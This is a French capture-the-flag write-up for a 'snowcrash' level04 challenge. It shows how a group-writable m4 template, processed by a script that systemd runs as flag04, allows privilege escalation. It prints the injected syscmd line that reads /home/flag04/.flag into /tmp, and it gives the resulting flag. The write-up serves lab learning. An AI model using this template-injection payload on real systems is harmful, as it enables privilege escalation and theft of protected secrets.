En commençant par regarder ce qui se trouve dans `level04` :

```bash
ls -la /opt/snowcrash/level04/
```

On obtient :

```text
level04@snowcrash:~$ ls -la /opt/snowcrash/level04/
total 16
drwxr-xr-x  2 root root 4096 Jun  9 19:03 .
drwxr-xr-x 18 root root 4096 Jun  9 19:04 ..
-rwxr-xr-x  1 root root 4241 Jun  9 19:03 babel.sh
```

On trouve donc le fichier `babel.sh`.

En essayant de l'exécuter directement :

```bash
./babel.sh
```

on obtient plusieurs erreurs `Permission denied` :

```text
./babel.sh: line 15: /var/log/babel/babel.log: Permission denied
./babel.sh: line 15: /var/log/babel/babel.log: Permission denied
cp: cannot create regular file '/var/lib/babel/output.conf.bak': Permission denied
./babel.sh: line 98: /var/lib/babel/output.conf: Permission denied
```

Ces erreurs sont normales puisque nous exécutons le script avec l'utilisateur `level04`, qui n'a pas les permissions nécessaires pour écrire dans ces fichiers.

En regardant le contenu de `babel.sh`, on trouve plusieurs éléments intéressants :

```bash
TEMPLATE_DIR="/var/lib/babel/templates"
OUTPUT_DIR="/var/lib/babel"
```

et notamment :

```bash
if m4 "${TEMPLATE}" > "${OUTPUT_CONF}" 2>> "${LOG_FILE}"; then
    log "Template processed successfully"
fi
```

Le script utilise donc `m4` pour traiter un template situé dans :

```text
/var/lib/babel/templates/template.m4
```

Nous allons donc regarder les permissions de ce fichier :

```bash
ls -l /var/lib/babel/templates/template.m4
```

On obtient :

```text
-rw-rw-r-- 1 root babel 4819 Sep  9 12:59 template.m4
```

Le fichier appartient à `root`, mais son groupe est `babel` et il est inscriptible par le groupe. Comme `level04` possède les droits permettant de modifier ce fichier, nous pouvons contrôler le template utilisé par `babel.sh`.

Le fichier contient un template `m4` permettant de générer une configuration pour nginx. Il est donc intéressant de voir si `babel.sh` est exécuté automatiquement avec un autre utilisateur.

Nous vérifions alors les services systemd :

```bash
cat /etc/systemd/system/babel.service
```

qui donne :

```ini
[Unit]
Description=Babel configuration generator (one-shot)
After=network.target

[Service]
Type=oneshot
User=flag04
ExecStart=/opt/snowcrash/level04/babel.sh
StandardOutput=journal
StandardError=journal
```

On remarque que `babel.sh` est exécuté avec l'utilisateur `flag04`.

Nous vérifions également le timer :

```bash
cat /etc/systemd/system/babel.timer
```

qui donne :

```ini
[Unit]
Description=Babel configuration generator — runs every 30 seconds
Requires=babel.service

[Timer]
OnBootSec=10s
OnUnitActiveSec=30s
AccuracySec=1s

[Install]
WantedBy=timers.target
```

Le service est donc exécuté automatiquement toutes les 30 secondes avec les privilèges de `flag04`.

Nous avons alors la chaîne suivante :

```text
level04
   │
   │ peut modifier
   ▼
template.m4
   │
   │ est traité par m4
   ▼
babel.sh
   │
   │ exécuté par systemd
   │ avec User=flag04
   ▼
flag04
```

Nous pouvons donc profiter du fait que `m4` permet d'exécuter des commandes système avec `syscmd`.

Nous ajoutons dans `template.m4` :

```m4
syscmd(`cat /home/flag04/.flag > /tmp/babel_flag_out')
```

Lorsque le timer lance `babel.service`, `babel.sh` traite alors notre template avec `m4`. La commande `syscmd` est exécutée avec les privilèges de `flag04` et copie le contenu de `/home/flag04/.flag` dans :

```text
/tmp/babel_flag_out
```

Ce fichier étant accessible à `level04`, nous pouvons finalement récupérer le flag avec :

```bash
cat /tmp/babel_flag_out
```

On obtient alors :

```text
ne2searoevaevoem4ov4ar8ap
```

Le flag est donc :

```text
ne2searoevaevoem4ov4ar8ap
```
